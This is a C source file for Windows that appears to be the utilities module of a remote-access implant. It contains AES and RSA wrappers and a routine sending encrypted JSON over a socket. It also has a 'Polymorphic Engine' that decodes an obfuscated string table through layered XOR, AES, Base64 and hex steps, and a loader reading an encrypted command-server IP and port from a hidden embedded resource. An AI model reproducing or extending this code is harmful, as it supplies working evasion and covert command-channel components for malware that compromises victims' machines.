#include "utils.h"
#include "config.h"
#include "cJSON.h"
#include <wincrypt.h>
#include <bcrypt.h>
#include <ctype.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")

// --- Decoders ---

char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length) {
    DWORD out_len = 0; if (!CryptBinaryToStringA(data, (DWORD)input_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &out_len)) return NULL;
    char* out = (char*)malloc(out_len); if (!CryptBinaryToStringA(data, (DWORD)input_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, out, &out_len)) { free(out); return NULL; }
    if (output_length) *output_length = out_len; return out;
}

unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length) {
    DWORD out_len = 0; if (!CryptStringToBinaryA(data, (DWORD)input_length, CRYPT_STRING_BASE64, NULL, &out_len, NULL, NULL)) return NULL;
    unsigned char* out = (unsigned char*)malloc(out_len); if (!CryptStringToBinaryA(data, (DWORD)input_length, CRYPT_STRING_BASE64, out, &out_len, NULL, NULL)) { free(out); return NULL; }
    if (output_length) *output_length = out_len; return out;
}

static unsigned char* hex_decode(const char* in, size_t len, size_t* out_len) {
    DWORD dwLen = 0; if (!CryptStringToBinaryA(in, (DWORD)len, CRYPT_STRING_HEX, NULL, &dwLen, NULL, NULL)) return NULL;
    unsigned char* out = (unsigned char*)malloc(dwLen); if (!CryptStringToBinaryA(in, (DWORD)len, CRYPT_STRING_HEX, out, &dwLen, NULL, NULL)) { free(out); return NULL; }
    if (out_len) *out_len = dwLen; return out;
}

char* str_replace(const char* orig, const char* rep, const char* with) {
    char *result, *ins, *tmp; int len_rep, len_with, len_front, count;
    if (!orig || !rep) return NULL; len_rep = (int)strlen(rep); if (len_rep == 0) return NULL; if (!with) with = ""; len_with = (int)strlen(with);
    ins = (char*)orig; for (count = 0; (tmp = strstr(ins, rep)); ++count) ins = tmp + len_rep;
    tmp = result = malloc(strlen(orig) + (len_with - len_rep) * count + 1); if (!result) return NULL;
    while (count--) { ins = strstr(orig, rep); len_front = (int)(ins - orig); tmp = strncpy(tmp, orig, len_front) + len_front; tmp = strcpy(tmp, with) + len_with; orig += len_front + len_rep; }
    strcpy(tmp, orig); return result;
}

void str_trim(char* s) { char* p = s; size_t l = strlen(p); while (l > 0 && isspace(p[l - 1])) p[--l] = 0; while (*p && isspace(*p)) ++p, --l; memmove(s, p, l + 1); }

extern SessionKey g_session;
void sock_send_ex(SOCKET sock, HANDLE mutex, const char* type, const char* msg) {
    if (mutex) WaitForSingleObject(mutex, INFINITE);
    cJSON *root = cJSON_CreateObject(); cJSON_AddStringToObject(root, "type", type); cJSON_AddStringToObject(root, "payload", msg);
    char *json_msg = cJSON_PrintUnformatted(root); char *encrypted = aes_256_cbc_encrypt((unsigned char*)json_msg, (int)strlen(json_msg), g_session.key, g_session.iv);
    cJSON *packet = cJSON_CreateObject(); cJSON_AddStringToObject(packet, "data", encrypted);
    char *iv_b64 = base64_encode(g_session.iv, 16, NULL); cJSON_AddStringToObject(packet, "iv", iv_b64);
    char *final_json = cJSON_PrintUnformatted(packet); char *buf = (char*)malloc(strlen(final_json) + 2); sprintf(buf, "%s\n", final_json);
    send(sock, (const char*)buf, (int)strlen(buf), 0); free(buf); free(final_json); free(iv_b64); free(encrypted); free(json_msg); cJSON_Delete(packet); cJSON_Delete(root);
    if (mutex) ReleaseMutex(mutex);
}

void sock_send(SOCKET sock, HANDLE mutex, const char* msg) { sock_send_ex(sock, mutex, s(KSTR_RESPONSE), msg); }

char* rsa_encrypt_pkcs1(const unsigned char* data, size_t len, const char* pubkey_pem) {
    DWORD derLen = 0; CERT_PUBLIC_KEY_INFO *pubKeyInfo = NULL; DWORD pubKeyInfoLen = 0; HCRYPTPROV hProv = 0; HCRYPTKEY hRSAKey = 0; char* out = NULL;
    if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, NULL, &derLen, NULL, NULL)) {
        BYTE* der = malloc(derLen); CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, der, &derLen, NULL, NULL);
        if (CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, der, derLen, CRYPT_DECODE_ALLOC_FLAG, NULL, &pubKeyInfo, &pubKeyInfoLen)) {
            if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
                if (CryptImportPublicKeyInfo(hProv, X509_ASN_ENCODING, pubKeyInfo, &hRSAKey)) {
                    DWORD encLen = (DWORD)len; if (CryptEncrypt(hRSAKey, 0, TRUE, 0, NULL, &encLen, 0)) {
                        BYTE* encBuf = malloc(encLen); memcpy(encBuf, data, len); DWORD dataLen = (DWORD)len;
                        if (CryptEncrypt(hRSAKey, 0, TRUE, 0, encBuf, &dataLen, encLen)) {
                            for (DWORD i = 0; i < dataLen / 2; i++) { BYTE temp = encBuf[i]; encBuf[i] = encBuf[dataLen - 1 - i]; encBuf[dataLen - 1 - i] = temp; }
                            out = base64_encode(encBuf, dataLen, NULL);
                        }
                        free(encBuf);
                    }
                    CryptDestroyKey(hRSAKey);
                }
                CryptReleaseContext(hProv, 0);
            }
            LocalFree(pubKeyInfo);
        }
        free(der);
    }
    return out;
}

char* aes_256_cbc_encrypt(const unsigned char* plain, size_t len, const unsigned char* key, const unsigned char* iv) {
    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_KEY_HANDLE hKey = NULL; DWORD cbKeyObject = 0, cbResult = 0, cbCipherText = 0; PBYTE pbKeyObject = NULL, pbCipherText = NULL; char* out = NULL;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return NULL;
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    pbKeyObject = (PBYTE)malloc(cbKeyObject); BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0);
    BYTE ivCopy[16]; memcpy(ivCopy, iv, 16); BCryptEncrypt(hKey, (PBYTE)plain, (DWORD)len, NULL, ivCopy, 16, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING);
    pbCipherText = malloc(cbCipherText); memcpy(ivCopy, iv, 16); BCryptEncrypt(hKey, (PBYTE)plain, (DWORD)len, NULL, ivCopy, 16, pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING);
    out = base64_encode(pbCipherText, cbResult, NULL);
    if (pbCipherText) free(pbCipherText); if (hKey) BCryptDestroyKey(hKey); if (pbKeyObject) free(pbKeyObject); if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0); return out;
}

unsigned char* aes_256_cbc_decrypt(const char* cipher_b64, size_t* out_len, const unsigned char* key, const unsigned char* iv) {
    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_KEY_HANDLE hKey = NULL; DWORD cbKeyObject = 0, cbResult = 0, cbPlain = 0; PBYTE pbKeyObject = NULL, pbPlain = NULL, pbCipher = NULL; size_t cipherLen = 0;
    pbCipher = base64_decode(cipher_b64, (int)strlen(cipher_b64), &cipherLen); if (!pbCipher) return NULL;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) goto cleanup;
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    pbKeyObject = (PBYTE)malloc(cbKeyObject); BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0);
    BYTE ivCopy[16]; memcpy(ivCopy, iv, 16);
    if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, NULL, 0, &cbPlain, BCRYPT_BLOCK_PADDING) != 0) {
        if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, NULL, 0, &cbPlain, 0) != 0) goto cleanup;
    }
    pbPlain = malloc(cbPlain + 1); memcpy(ivCopy, iv, 16);
    if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, pbPlain, cbPlain, &cbResult, BCRYPT_BLOCK_PADDING) != 0) {
        BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, pbPlain, cbPlain, &cbResult, 0);
    }
    if (out_len) *out_len = cbResult;
cleanup:
    if (pbCipher) free(pbCipher); if (hKey) BCryptDestroyKey(hKey); if (pbKeyObject) free(pbKeyObject); if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0); return pbPlain;
}

void get_formatted_time(unsigned long long secs, char* out_buf) {
    unsigned long long minute = (secs % 3600) / 60, hour = (secs % 86400) / 3600, days = secs / 86400, year = 1970;
    while (1) { unsigned long long dy = ((year % 4 == 0 && year % 100 != 0) || (year % 400 == 0)) ? 366 : 365; if (days < dy) break; days -= dy; year++; }
    unsigned long long months[] = {31, ((year % 4 == 0 && year % 100 != 0) || (year % 400 == 0)) ? 29u : 28u, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};
    unsigned long long month = 1; for (int i = 0; i < 12; i++) { if (days < months[i]) break; days -= months[i]; month++; }
    sprintf(out_buf, "%02llu.%02llu.%llu %02llu:%02llu", days + 1, month, year, hour, minute);
}

// --- Polymorphic Engine ---

static char* g_strings[KSTR_COUNT] = {0};
static ObfMetadata g_obf_meta = {0};

static unsigned char* polymorphic_decode(const char* input) {
    size_t in_len = strlen(input), cur_len = 0;
    unsigned char* cur_data = hex_decode(input, (int)in_len, &cur_len); if (!cur_data) return NULL;
    for (int i = g_obf_meta.transform_count - 1; i >= 0; i--) {
        int type = g_obf_meta.transform_order[i]; size_t next_len = 0; unsigned char* next_data = NULL;
        switch(type) {
            case 0: for (size_t j = 0; j < cur_len; j++) cur_data[j] ^= g_obf_meta.xor_key1; break;
            case 1: next_data = aes_256_cbc_decrypt((const char*)base64_encode(cur_data, cur_len, NULL), &next_len, g_obf_meta.aes_key, g_obf_meta.aes_iv);
                    if (next_data) { free(cur_data); cur_data = next_data; cur_len = next_len; } break;
            case 2: next_data = base64_decode((const char*)cur_data, cur_len, &next_len); if (next_data) { free(cur_data); cur_data = next_data; cur_len = next_len; } break;
            case 4: next_data = hex_decode((const char*)cur_data, cur_len, &next_len); if (next_data) { free(cur_data); cur_data = next_data; cur_len = next_len; } break;
            case 9: for (size_t j = 0; j < cur_len; j++) cur_data[j] ^= g_obf_meta.xor_key2; break;
        }
        if (!cur_data) return NULL;
    }
    unsigned char* final = malloc(cur_len + 1); memcpy(final, cur_data, cur_len); final[cur_len] = 0; free(cur_data); return final;
}

const char* s(StringIndex idx) { if (idx < 0 || idx >= KSTR_COUNT) return ""; return g_strings[idx] ? g_strings[idx] : ""; }

char g_host[256] = {0}; int g_port = 0;
void load_config_from_resource() {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RESOURCE_ID), RT_RCDATA); if (!hRes) return;
    HGLOBAL hData = LoadResource(NULL, hRes); if (!hData) return;
    unsigned char* pData = (unsigned char*)LockResource(hData); if (!pData) return;
    unsigned char marker[16]; SET_MARKER(marker); if (memcmp(pData, marker, 16) != 0) return;
    memcpy(&g_obf_meta, pData + 16, sizeof(ObfMetadata));
    unsigned char* enc_cfg = pData + 16 + sizeof(ObfMetadata); size_t enc_cfg_len = 8192 - 16 - sizeof(ObfMetadata);
    unsigned char key[32], iv[16]; memcpy(key, CONFIG_KEY, 32); memcpy(iv, CONFIG_IV, 16);
    size_t plain_len; char* cfg_b64 = base64_encode(enc_cfg, enc_cfg_len, NULL);
    unsigned char* pbPlain = aes_256_cbc_decrypt(cfg_b64, &plain_len, key, iv); free(cfg_b64);
    if (pbPlain) {
        pbPlain[plain_len] = 0; cJSON* root = cJSON_Parse((const char*)pbPlain);
        if (root) {
            cJSON* ip = cJSON_GetObjectItem(root, "ip"); cJSON* port = cJSON_GetObjectItem(root, "port");
            if (ip) strncpy(g_host, ip->valuestring, sizeof(g_host) - 1); if (port) g_port = port->valueint;
            cJSON* list = cJSON_GetObjectItem(root, "s");
            if (list) { for (int i = 0; i < cJSON_GetArraySize(list) && i < KSTR_COUNT; i++) {
                cJSON* item = cJSON_GetArrayItem(list, i); if (item && item->valuestring) g_strings[i] = (char*)polymorphic_decode(item->valuestring);
            } }
            cJSON_Delete(root);
        }
        free(pbPlain);
    }
}
